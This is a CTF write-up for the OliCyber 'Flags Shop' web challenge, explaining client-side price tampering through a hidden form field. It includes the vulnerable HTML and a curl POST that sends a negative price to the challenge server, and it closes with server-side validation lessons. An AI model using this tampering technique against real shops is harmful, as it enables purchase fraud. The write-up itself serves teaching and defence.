# Flags Shop

**Competition:** OliCyber<br>
**Category:** Web / Price Tampering<br>
**URL:** http://shops.challs.olicyber.it

---

## Description

> Wow this site sells amazing 'flags', but the one I want costs too much. Can you help me?

A flag shop with three items available and an initial budget of **100 €**. The goal is to buy the Anonymous flag which costs **1000 €**, 10 times our budget.

| Item | Price |
|---|---|
| French flag | 10 € |
| Italian flag | 100 € |
| **Anonymous flag** | **1000 €** |

---

## Solution

### Step 1 — Vulnerability Analysis

By examining the HTML code of the page, each BUY button sends a form via **POST** to `buy.php` with two hidden fields:

```html
<form action="buy.php" method="POST">
    <input type="hidden" name="id" value="2">
    <input type="hidden" name="costo" value="1000">
    <button type="submit">ACQUISTA</button>
</form>
```

The `costo` field is a **client-side input**: the browser sends it as is, and the server blindly trusts the received value to deduct money from the account. There is no server-side validation that checks if the price actually corresponds to the selected item.

This is a classic case of **Client-Side Price Tampering**: by manipulating the `costo` field before submission, we can control how much is charged, including a **negative value** which instead of subtracting... adds credit.

---

### Step 2 — Vulnerability Identification

The server-side logic calculates the new balance as:

```
new_balance = current_balance - cost_received
```

If the `cost` is negative:

```
new_balance = 100 - (-1000) = 1100 €
```

Instead of deducting funds, it adds them — and the condition `balance >= cost` is always true.

---

### Step 3 — Exploit with Manipulated POST

We force the purchase of the Anonymous flag (`id=2`) by setting the cost to `-1000`:

```bash
curl -s -X POST http://shops.challs.olicyber.it/buy.php \
  -d 'id=2&costo=-1000'
```

**Server output:**

```
Ci hai truffati, ne siamo sicuri. Non ti daremo la preziosa bandiera
degli anonymous ma questa: flag{...}
```

The server detected the anomaly and "ironically" delivered the flag anyway!

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | Client-Side Price Tampering |
| **Root Cause** | The `costo` field is client-controlled and not validated server-side |
| **Vector** | Modification of POST parameter `costo` with negative value |
| **Impact** | Purchase of any item at arbitrary price |

---

### Why does it work?

The server calculates the new balance as the difference between the current balance and the cost received from the client. With a negative cost, the subtraction operation becomes an addition, increasing the balance instead of decreasing it.

---

## Conclusions

- **Never trust prices sent by the client** — they must always be calculated/verified server-side
- Always retrieve the price from the database based on the item ID, not from the form
- Validate that the user can actually afford the purchase **before** processing it
- Data sent by the client is always controllable by the attacker
- Implement a logging system to detect suspicious transactions (increasing balance, anomalous prices, etc.)
- Completely separate presentation logic from business logic — price is business logic and must remain server-side